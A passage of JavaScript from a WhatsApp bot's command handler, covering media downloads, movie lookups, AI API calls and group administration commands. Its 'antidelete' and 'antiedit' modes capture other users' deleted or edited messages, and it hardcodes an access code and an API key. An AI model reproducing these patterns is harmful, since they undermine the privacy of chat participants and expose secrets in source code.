                const msg = messageUpdate?.messages[0]
                if (!msg?.message) return
                const replyText = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim()
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId
                if (stanzaId !== sentMsg?.key?.id) return
                const num = parseInt(replyText)
                if (isNaN(num) || num < 1 || num > allFormats.length) return
                devtrust.ev.off('messages.upsert', _ytdlHandler)
                await devtrust.sendMessage(m.chat, { react: { text: '⬇️', key: msg.key } })
                const selected = allFormats[num - 1]
                const isVideo = num <= d.video_formats.length
                await devtrust.sendMessage(m.chat, { text: `⏳ Downloading ${selected.quality} ${selected.format}...` }, { quoted: msg })
                const ext = selected.format.toLowerCase() === 'opus' ? 'ogg' : selected.format.toLowerCase()
                const fileName = `${(d.title || 'file').replace(/[<>:"/\\|?*]+/g, '').substring(0, 50)}_${selected.quality}.${ext}`
                const dlBuf = await axios.get(selected.download_url, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                    timeout: 300000,
                    maxContentLength: 500 * 1024 * 1024
                })
                const fileBuffer = Buffer.from(dlBuf.data)
                if (isVideo) {
                    await devtrust.sendMessage(m.chat, {
                        video: fileBuffer,
                        caption: `🎬 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`,
                        mimetype: 'video/mp4', fileName
                    }, { quoted: msg })
                } else {
                    await devtrust.sendMessage(m.chat, {
                        audio: fileBuffer,
                        mimetype: 'audio/mpeg', fileName,
                        caption: `🎵 *${d.title}*\n🎚️ *Quality:* ${selected.quality}\n📦 *Size:* ${selected.size_mb}`
                    }, { quoted: msg })
                }
                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } })
            } catch (err) {
                console.error('ytdl handler error:', err.message)
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
            }
        }
        devtrust.ev.on('messages.upsert', _ytdlHandler)
        setTimeout(() => devtrust.ev.off('messages.upsert', _ytdlHandler), 180000)
    } catch (err) {
        console.error('ytdl error:', err.message)
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        reply(`❌ YouTube download failed: ${err.message}`)
    }
}
break;

case 'dlstatus':
case 'swdl':
case 'statusdl': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const _m = m.message;
    const _type = Object.keys(_m)[0];
    const _ctxInfo = _m[_type]?.contextInfo;
    if (!_ctxInfo || !_ctxInfo.quotedMessage) {
        return reply('📌 *Please reply to a Status update to download it.*');
    }
    const _quotedMsg = _ctxInfo.quotedMessage;
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
        const _quotedType = Object.keys(_quotedMsg)[0];
        const _mediaData = _quotedMsg[_quotedType];
        if (_quotedType === 'conversation' || _quotedType === 'extendedTextMessage') {
            const _txt = _quotedMsg.conversation || _quotedMsg.extendedTextMessage?.text || '';
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            return reply(`📝 *Status Text:*\n\n${_txt}`);
        }
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const _mediaType = _quotedType.replace('Message', '');
        const _stream = await downloadContentFromMessage(_mediaData, _mediaType);
        let _buf = Buffer.from([]);
        for await (const chunk of _stream) { _buf = Buffer.concat([_buf, chunk]); }
        if (!_buf.length) throw new Error('Empty buffer — media could not be downloaded');
        if (_quotedType === 'imageMessage') {
            await devtrust.sendMessage(m.chat, { image: _buf, caption: _mediaData.caption || '📸 *Status Image*' }, { quoted: m });
        } else if (_quotedType === 'videoMessage') {
            await devtrust.sendMessage(m.chat, { video: _buf, caption: _mediaData.caption || '🎥 *Status Video*', mimetype: 'video/mp4' }, { quoted: m });
        } else if (_quotedType === 'audioMessage') {
            await devtrust.sendMessage(m.chat, { audio: _buf, mimetype: 'audio/mp4', ptt: false }, { quoted: m });
        } else if (_quotedType === 'documentMessage') {
            await devtrust.sendMessage(m.chat, { document: _buf, mimetype: _mediaData.mimetype || 'application/octet-stream', fileName: _mediaData.fileName || 'status_file' }, { quoted: m });
        } else {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *Unsupported status type:* ${_quotedType}`);
        }
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('Status DL Error:', e);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Failed to download status:* ${e.message}`);
    }
}
break;

case 'movie':
case 'film':
case 'imdb': {
    const OMDB_KEY = 'trilogy';
    if (!text) {
        return reply(
            `🎬 *Movie Info*\n\n` +
            `*Usage:* \`${prefix}movie <name>\`\n\n` +
            `*Examples:*\n` +
            `• \`${prefix}movie Pathaan\`\n` +
            `• \`${prefix}movie Avengers Endgame\`\n` +
            `• \`${prefix}movie Black Panther\`\n\n` +
            `Works for Bollywood, Hollywood, and all languages!`
        );
    }
    await reply(`🔍 Searching *${text}*...`);
    try {
        const _year = text.match(/\b(19|20)\d{2}\b/)?.[0];
        const _title = text.replace(/\b(19|20)\d{2}\b/, '').trim();
        let _url = `https://www.omdbapi.com/?t=${encodeURIComponent(_title)}&apikey=${OMDB_KEY}&plot=full`;
        if (_year) _url += `&y=${_year}`;
        const _res = await axios.get(_url, { timeout: 15000 });
        let _data = _res.data;
        if (_data.Response === 'False') {
            const _sRes = await axios.get(`https://www.omdbapi.com/?s=${encodeURIComponent(_title)}&apikey=${OMDB_KEY}&type=movie`, { timeout: 15000 });
            if (_sRes.data.Response === 'True' && _sRes.data.Search?.length) {
                const _first = _sRes.data.Search[0];
                const _dRes = await axios.get(`https://www.omdbapi.com/?i=${_first.imdbID}&apikey=${OMDB_KEY}&plot=full`, { timeout: 15000 });
                _data = _dRes.data;
            }
        }
        if (_data.Response === 'False') {
            return reply(`❌ *Movie not found:* ${text}`);
        }
        const _ratings = (_data.Ratings || []).map(r => `• ${r.Source}: *${r.Value}*`).join('\n');
        const _stars = _data.imdbRating !== 'N/A'
            ? '⭐'.repeat(Math.round(parseFloat(_data.imdbRating) / 2)) + ` (${_data.imdbRating}/10)`
            : 'N/A';
        const _movieText =
            `🎬 *${_data.Title}* (${_data.Year})\n\n` +
            `🎭 *Genre:* ${_data.Genre}\n` +
            `🌍 *Language:* ${_data.Language}\n` +
            `🎬 *Director:* ${_data.Director}\n` +
            `🎭 *Cast:* ${_data.Actors}\n` +
            `⏱️ *Runtime:* ${_data.Runtime}\n` +
            `🏆 *Awards:* ${_data.Awards}\n\n` +
            `${_stars}\n` +
            `${_ratings}\n\n` +
            `📝 *Plot:*\n${_data.Plot}\n\n` +
            (_data.BoxOffice && _data.BoxOffice !== 'N/A' ? `💰 *Box Office:* ${_data.BoxOffice}\n` : '') +
            `🔗 imdb.com/title/${_data.imdbID}`;
        await reply(_movieText);
    } catch (error) {
        console.error('Movie error:', error.message);
        reply(`❌ *Failed:* ${error.message}`);
    }
}
break;

case 'ibsbmg': {
    if (!q) return reply(`🎨 *Use:* img prompt,ratio\nExample: img robin,3:4`);

    let parts = q.split(',');
    let prompt = parts[0]?.trim();
    let ratio = parts[1]?.trim() || "1:1";

    try {
        let apiUrl = `https://apis.prexzyvilla.site/ai/imagen?prompt=${encodeURIComponent(prompt)}&ratio=${encodeURIComponent(ratio)}`;
        let res = await fetch(apiUrl);
        let data = await res.json();

        if (data.status && data.result) {
            await devtrust.sendMessage(m.chat,
                addNewsletterContext({
                    image: { url: data.result },
                    caption: `🎨 *${prompt}* (${ratio})`
                }),
                { quoted: m }
            );
        } else {
            reply("❌ *Failed to generate image*");
        }
    } catch (e) {
        console.error(e);
        reply("⚠️ *Error fetching from API*");
    }
}
break;

case 'kick': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.quoted) return reply("👤 *Tag or quote user to kick*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    let users = m.mentionedJid[0] || m.quoted?.sender || 
                text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    await devtrust.groupParticipantsUpdate(m.chat, [users], 'remove');
    reply("✅ *User kicked*");
}
break;

case 'listadmin':
case 'tagadmin':
case 'admin': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    const owner = groupMetadata.owner || 
                 groupAdmins.find(p => p.admin === 'superadmin')?.id || 
                 m.chat.split`-`[0] + '@s.whatsapp.net';

    let text = `👑 *Admins*\n\n${listAdmin}`;
    
    devtrust.sendMessage(m.chat, {
        text,
        mentions: [...groupAdmins.map(v => v.id), owner]
    }, { quoted: m });
}
break;

case 'delete':
case 'del': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.quoted) return reply("🗑️ *Reply to a message to delete it*");

    devtrust.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
}
break;

case 'grouplink': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    
    let response = await devtrust.groupInviteCode(m.chat);
    reply(`🔗 *Group Link*\nhttps://chat.whatsapp.com/${response}`);
}
break;

case 'tag':
case 'totag': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins) return reply("👑 *Admin only*");
    if (!m.quoted) return reply(`💬 *Reply to a message with ${prefix + command}*`);

    devtrust.sendMessage(m.chat, {
        forward: m.quoted.fakeObj,
        mentions: participants.map(a => a.id)
    });
}
break;

case 'broadcast': { 
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!q) return reply(`📢 *No broadcast message provided*`);
    
    let getGroups = await devtrust.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).slice(0).map(entry => entry[1]);
    let res = groups.map(v => v.id);
    
    reply(`📨 *Broadcasting to ${res.length} groups*`);
    
    for (let i of res) {
        await devtrust.sendMessage(i, 
            addNewsletterContext({
                image: { url: "https://files.catbox.moe/smv12k.jpeg" },
                caption: `📢 *Broadcast*\n\n${qtext}`
            })
        );
    }
    
    reply(`✅ *Broadcast sent to ${res.length} groups*`);
} 
break;

case "spotify":
case "spotifydl":
case "sp": {
    if (!text) {
        return reply(`🎧 *CYBER Spotify*\n\nUsage: ${prefix}spotify [spotify_track_link]\nExample: ${prefix}spotify https://open.spotify.com/track/xxxxx`);
    }
    
    // Validate Spotify URL
    if (!text.includes('open.spotify.com/track/')) {
        return reply(`❌ *CYBER Spotify*\n\nInvalid Spotify track link. Please provide a valid track URL.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🎧', key: m.key } });
        
        reply(`🔍 *CYBER Spotify*\n\nFetching track: ${text.split('/track/')[1]?.substring(0, 10)}...`);
        
        const response = await axios.get(`https://apis.davidcyril.name.ng/spotifydl2`, {
            params: {
                url: text,
                apikey: ""
            },
            timeout: 30000
        });
        
        if (response.data.success && response.data.results) {
            const result = response.data.results;
            
            // Send audio with rich preview
            await devtrust.sendMessage(m.chat, 
                addNewsletterContext({
                    audio: { url: result.downloadMP3 },
                    mimetype: 'audio/mpeg',
                    fileName: `${result.title}.mp3`,
                    contextInfo: {
                        externalAdReply: {
                            title: result.title,
                            body: `🎧 ${result.type || 'Track'}`,
                            thumbnailUrl: result.image,
                            mediaType: 1,
                            renderLargerThumbnail: true,
                            sourceUrl: text
                        }
                    }
                }), 
                { quoted: m }
            );
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            
        } else {
            throw new Error('No download link found');
        }
        
    } catch (error) {
        console.error('Spotify error:', error.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        
        if (error.response?.status === 404) {
            return reply(`❌ *CYBER Spotify*\n\nTrack not found. Check the link and try again.`);
        }
        
        reply(`⚠️ *CYBER Spotify*\n\nSpotify service is on break. Try again later.`);
    }
}
break;

case 'groupstatus':
case 'gstatus':
case 'gst': {
    if (!m.isGroup) {
        return reply(`👥 *CYBER Group Status*\n\nThis command can only be used in groups.`);
    }
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '📢', key: m.key } });
        
        // Check if replying to a message or providing text
        const quotedMsg = m.quoted;
        const textInput = text;
        
        if (!quotedMsg && !textInput) {
            return reply(`📢 *CYBER Group Status*\n\nReply to an image/video/audio or provide text to post as group status.\n\nExample: ${prefix}gstatus Hello group!`);
        }
        
        // Simple random ID generator
        function generateMessageId() {
            return '3EB0' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        }
        
        let statusInnerMessage = {};
        
        // ==========================================
        // 1. HANDLE TEXT STATUS (BLACK BACKGROUND)
        // ==========================================
        if (!quotedMsg && textInput) {
            statusInnerMessage = {
                extendedTextMessage: {
                    text: textInput,
                    backgroundArgb: 0xFF000000, // BLACK background
                    textArgb: 0xFFFFFFFF, // White text
                    font: 1,
                    contextInfo: { 
                        mentionedJid: [],
                        isGroupStatus: true 
                    }
                }
            };
            
            // Create and send status
            const statusPayload = {
                groupStatusMessageV2: {
                    message: statusInnerMessage
                }
            };
            
            const statusId = generateMessageId();
            await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            return reply(`📢 *CYBER Group Status*\n\nText status posted!`);
        }
        
        // ==========================================
        // 2. HANDLE QUOTED MEDIA/TEXT
        // ==========================================
        else if (quotedMsg) {
            // Check if it's a media message
            const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
            
            // IMAGE STATUS
            if (/image/.test(mime)) {
                // Download image
                let media = await quotedMsg.download();
                
                // Send as image status
                await devtrust.sendMessage(m.chat, {
                    image: media,
                    caption: textInput || quotedMsg.caption || '',
                    contextInfo: { isGroupStatus: true }
                });
            } 
            
            // VIDEO STATUS
            else if (/video/.test(mime)) {
                // Download video
                let media = await quotedMsg.download();
                
                // Send as video status
                await devtrust.sendMessage(m.chat, {
                    video: media,
                    caption: textInput || quotedMsg.caption || '',
                    contextInfo: { isGroupStatus: true }
                });
            }
            
            // AUDIO STATUS (NEW)
            else if (/audio/.test(mime)) {
                // Download audio
                let media = await quotedMsg.download();
                
                // Send as audio status
                await devtrust.sendMessage(m.chat, {
                    audio: media,
                    mimetype: 'audio/mpeg',
                    ptt: false, // true for voice note
                    contextInfo: { isGroupStatus: true }
                });
            }
            
            // TEXT STATUS (Quoted text - BLACK BACKGROUND)
            else if (quotedMsg.conversation || quotedMsg.text) {
                const textContent = quotedMsg.conversation || quotedMsg.text || textInput;
                
                statusInnerMessage = {
                    extendedTextMessage: {
                        text: textContent,
                        backgroundArgb: 0xFF000000, // BLACK background
                        textArgb: 0xFFFFFFFF, // White text
                        font: 2,
                        contextInfo: { 
                            mentionedJid: [],
                            isGroupStatus: true 
                        }
                    }
                };
                
                const statusPayload = {
                    groupStatusMessageV2: {
                        message: statusInnerMessage
                    }
                };
                
                const statusId = generateMessageId();
                await devtrust.relayMessage(m.chat, statusPayload, { messageId: statusId });
                
            } else {
                return reply(`❌ *CYBER Group Status*\n\nUnsupported media type. Reply to image, video, audio, or text only.`);
            }
            
            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            reply(`📢 *CYBER Group Status*\n\nStatus posted!`);
        }
        
    } catch (error) {
        console.error('Group Status Error:', error);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`⚠️ *CYBER Group Status*\n\nFailed: ${error.message}`);
    }
}
break;

case 'tagall': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    const textMessage = args.join(" ") || "No message";
    let teks = `🏷️ *Tag All*\n\n📝 ${textMessage}\n\n`;

    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }

    devtrust.sendMessage(m.chat, {
        text: teks,
        mentions: participants.map((a) => a.id)
    }, { quoted: m });
}
break;

case 'hidetag': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    const groupMetadata = await devtrust.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    
    devtrust.sendMessage(m.chat, {
        text: q || ' ',
        mentions: participants.map(a => a.id)
    }, { quoted: m });
}
break;

case 'promote': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await devtrust.groupParticipantsUpdate(m.chat, [users], 'promote');
    reply("👑 *User promoted to admin*");
}
break;

case 'demote': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isCreator) return reply("🔒 *Owner only*");
    
    let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await devtrust.groupParticipantsUpdate(m.chat, [users], 'demote');
    reply("⬇️ *User demoted from admin*");
}
break;

case 'mute': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    await devtrust.groupSettingUpdate(m.chat, 'announcement');
    reply("🔇 *Group muted* • Only admins can message");
}
break;

case 'unmute': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");
    
    await devtrust.groupSettingUpdate(m.chat, 'not_announcement');
    reply("🔊 *Group unmuted* • Everyone can message");
}
break;

case 'left': {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    await devtrust.groupLeave(m.chat);
    reply("👋 *Left group* • Goodbye!");
}
break;

// ============ ANTIEDIT COMMAND ============
case 'antiedit':
case 'ae': {
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _aeCfgNow = loadAntieditCfg();
    const _aeCurrentMode = _aeCfgNow.mode || 'off';
    const _aeOption = args[0]?.toLowerCase();
    const _aeModeLabel = {
        'private': '🔒 private — ALL edits → saved messages',
        'private_pm': '🔒 private_pm — DM edits only → saved messages',
        'private_groups': '🔒 private_groups — Group edits only → saved messages',
        'chat': '💬 chat — ALL edits → same chat',
        'chat_groups': '💬 chat_groups — Group edits only → same chat',
        'off': '❌ off — Disabled'
    };
    if (!_aeOption) {
        return reply(
            `*✏️ ANTI-EDIT SETTINGS*\n\n` +
            `*Current Mode:* ${_aeModeLabel[_aeCurrentMode] || _aeCurrentMode}\n\n` +
            `*Delivery to saved messages (message myself):*\n` +
            `• \`${prefix}antiedit private\` — ALL edits (groups + PMs) → saved messages\n` +
            `• \`${prefix}antiedit private_pm\` — PM/DM edits only → saved messages\n` +
            `• \`${prefix}antiedit private_groups\` — Group edits only → saved messages\n\n` +
            `*Delivery back into chat:*\n` +
            `• \`${prefix}antiedit chat\` — ALL edits → reposted in same chat\n` +
            `• \`${prefix}antiedit chat_groups\` — Group edits only → reposted in chat\n\n` +
            `• \`${prefix}antiedit off\` — Disable`
        );
    }
    const _aeValidModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
    if (!_aeValidModes.includes(_aeOption)) {
        return reply(`❌ Invalid mode.\n\nValid: private, private_pm, private_groups, chat, chat_groups, off`);
    }
    saveAntieditCfg({ mode: _aeOption });
    return reply(`✅ *Anti-edit set to:* ${_aeModeLabel[_aeOption]}`);
}
break;

// ============ ADDKEY — 18+ ADULT UNLOCK ============
case 'addkey': {
    const _akSecretFile = './database/adult_secret.json';
    const _akUnlockedFile = './database/adult_unlocked.json';
    const _akBannedFile = './database/adult_banned.json';

    const _akSenderNum = (m.sender || '').split('@')[0].split(':')[0];

    // Load banned list
    let _akBanned = [];
    try { if (fs.existsSync(_akBannedFile)) _akBanned = JSON.parse(fs.readFileSync(_akBannedFile, 'utf-8')); } catch(e) {}
    const _akIsBanned = _akBanned.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum);
    if (_akIsBanned) return reply(`🚫 *Access Denied*\nYou have been permanently banned from 18+ content.`);

    if (!text) return reply(`🔑 *Usage:* ${prefix}addkey <code>\n\nEnter the 18+ access code provided by admin.`);

    // Load secret code
    let _akSecret = 'cybersecpro7898';
    try { if (fs.existsSync(_akSecretFile)) _akSecret = JSON.parse(fs.readFileSync(_akSecretFile, 'utf-8')).code || _akSecret; } catch(e) {}

    if (text.trim() !== _akSecret) return reply(`❌ *Wrong code!*\nContact admin for the correct 18+ access code.`);

    // Load and update unlocked list
    let _akUnlocked = [];
    try { if (fs.existsSync(_akUnlockedFile)) _akUnlocked = JSON.parse(fs.readFileSync(_akUnlockedFile, 'utf-8')); } catch(e) {}

    const _akAlreadyUnlocked = _akUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _akSenderNum);
    if (_akAlreadyUnlocked) return reply(`✅ *Already Unlocked*\nYou already have 18+ access.`);

    _akUnlocked.push(_akSenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_akUnlockedFile, JSON.stringify(_akUnlocked, null, 2));
    } catch(e) {}

    return reply(`✅ *18+ Access Unlocked!*\nYou can now use adult content commands.\nType *${prefix}removekey* to remove your access anytime.`);
}
break;

// ============ REMOVEKEY COMMAND ============
case 'removekey': {
    const _rkUnlockedFile = './database/adult_unlocked.json';
    const _rkSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    let _rkUnlocked = [];
    try { if (fs.existsSync(_rkUnlockedFile)) _rkUnlocked = JSON.parse(fs.readFileSync(_rkUnlockedFile, 'utf-8')); } catch(e) {}
    const _rkWasUnlocked = _rkUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _rkSenderNum);
    if (!_rkWasUnlocked) return reply(`ℹ️ *You don't have 18+ access.*\nNothing to remove.`);
    _rkUnlocked = _rkUnlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rkSenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_rkUnlockedFile, JSON.stringify(_rkUnlocked, null, 2));
    } catch(e) {}
    return reply(`✅ *18+ Access Removed!*\n🔒 Adult commands are now hidden from your menu.\nType *${prefix}addkey <code>* to unlock again.`);
}
break;

// ============ ANTIDELETE COMMAND ============
case 'antidelete':
case 'antidel':
case 'adel': {
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _adCfgBotNum = jidToNum(getBotJid(devtrust));
    const _adCfgNow = loadAntideleteCfg(_adCfgBotNum);
    const _adCurrentMode = _adCfgNow.mode || 'off';
    const _adAction = args[0]?.toLowerCase();
    const _adModeLabel = {
        'private': '🔒 private — ALL deletions (groups + PMs) → saved messages',
        'private_pm': '🔒 private_pm — PM/DM deletions only → saved messages',
        'private_groups': '🔒 private_groups — Group deletions only → saved messages',
        'chat': '💬 chat — ALL deletions → reposted in same chat',
        'chat_groups': '💬 chat_groups — Group deletions only → reposted in chat',
        'off': '❌ off — Disabled'
    };
    if (!_adAction) {
        return reply(
            `*🔰 ANTIDELETE SETTINGS 🔰*\n\n` +
            `*Current Mode:* ${_adModeLabel[_adCurrentMode] || _adCurrentMode}\n\n` +
            `*Delivery to saved messages (message myself):*\n` +
            `• \`${prefix}antidelete private\` — ALL deletions (groups + PMs) → saved messages\n` +
            `• \`${prefix}antidelete private_pm\` — PM/DM deletions only → saved messages\n` +
            `• \`${prefix}antidelete private_groups\` — Group deletions only → saved messages\n\n` +
            `*Delivery back into chat:*\n` +
            `• \`${prefix}antidelete chat\` — ALL deletions → reposted in same chat\n` +
            `• \`${prefix}antidelete chat_groups\` — Group deletions only → reposted in chat\n\n` +
            `• \`${prefix}antidelete off\` — Disable\n\n` +
            `_Note: Status deletions use_ \`statusantidelete\`\n\n` +
            `*Features:*\n` +
            `• Track deleted messages (text + media)\n` +
            `• Save deleted images/video/audio/stickers`
        );
    }
    const _adValidModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
    if (!_adValidModes.includes(_adAction)) {
        return reply(`❌ Invalid mode.\n\nValid: private, private_pm, private_groups, chat, chat_groups, off`);
    }
    const _adSaveBotNum = jidToNum(getBotJid(devtrust));
    saveAntideleteCfg({ mode: _adAction }, _adSaveBotNum);
    return reply(`✅ *Antidelete set to:* ${_adModeLabel[_adAction]}`);
}
break;

case 'add': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await devtrust.groupParticipantsUpdate(m.chat, [users], 'add');
    reply("✅ *User added to group*");
}
break;

case 'setpp': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!quoted || !/image/.test(mime)) return reply(`🖼️ *Reply to an image with ${prefix}setpp*`);
    
    let media = await quoted.download();
    await devtrust.updateProfilePicture(botNumber, media);
    reply('✅ *Profile picture updated*');
}
break;

case 'react-ch': 
case 'reactbcnch': {
    if (!isCreator) return reply(`🔒 *Owner only*`);

    if (!args[0]) {
        return reply("📌 *Usage:* reactch https://whatsapp.com/channel/... Robin");
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return reply("❌ *Invalid channel link*");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ');
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        const lower = c.toLowerCase();
        return hurufGaya[lower] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await devtrust.newsletterMetadata("invite", channelId);
        await devtrust.newsletterReactMessage(res.id, messageId, emoji);

        reply(`✅ *Reacted* ${emoji} in channel ${res.name}`);
    } catch (e) {
        console.error(e);
        reply("❌ *Failed to send reaction*");
    }
}
break;

case "gpt4": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message && m.message.extendedTextMessage && 
            m.message.extendedTextMessage.contextInfo && 
            m.message.extendedTextMessage.contextInfo.quotedMessage) {
            
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage && quoted.extendedTextMessage.text) 
                query = quoted.extendedTextMessage.text;
        }

        if (!query) {
            return reply("🤖 *Usage:* gpt4 your question");
        }

        const res = await fetch(`https://apis.prexzyvilla.site/ai/gpt4?text=${encodeURIComponent(query)}`);
        if (!res.ok) return reply(`⚠️ *API error* • ${res.status}`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from GPT-4*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *GPT-4*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error("gpt4 command error:", err);
        reply("⚠️ *GPT-4 unavailable* • Try later");
    }
}
break;

case 'mode': {
    reply(`🔹 *Mode:* ${devtrust.public ? 'Public' : 'Private'}`);
}
break;

case 'ping':
case 'speed': {
    const speed = require('performance-now');
    const timestampp = speed();
    const latensi = speed() - timestampp;
    
    reply(`⚡ *CYBER Ping*\n\n📡 ${latensi.toFixed(4)} ms`);
}
break;

case 'runtime':
case 'alive': {
    reply(`⚡ *CYBER Uptime*\n\n⏱️ ${runtime(process.uptime())}`);
}
break;

case 'public': {
    if (!isCreator) return reply("🔒 *Owner only*");
    setSetting("bot", "mode", "public");
    devtrust.public = true;
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync('./database/bot_mode.json', JSON.stringify({ mode: 'public' }, null, 2));
    } catch (e) {}
    reply("🌍 *Public mode activated*\nEveryone can use the bot");
}
break;

case 'private':
case 'self': {
    if (!isCreator) return reply("🔒 *Owner only*");
    setSetting("bot", "mode", "self");
    devtrust.public = false;
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync('./database/bot_mode.json', JSON.stringify({ mode: 'self' }, null, 2));
    } catch (e) {}
    reply("🔐 *Private mode activated*\nOnly bot owner & bot number can use the bot");
}
break;

case 'readmore': {
    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
    
    let [leftText, rightText] = text.split('|');
    if (!leftText) leftText = '';
    if (!rightText) rightText = '';
    
    const fullText = leftText + readmore + rightText;
    
    devtrust.sendMessage(m.chat, { text: fullText }, { quoted: m });
    break;
}

case "banuser1": 
case "banuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] ? m.mentionedJid[0] : 
                    text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : 
                    m.quoted ? m.quoted.sender : '';
        
        if (global.banned[orang]) return reply(`⚠️ *User already banned*`);
        
        global.banned[orang] = true;
        
        // Save to file
        try {
            fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
        } catch (e) {
            console.log("Error saving banned.json:", e);
        }
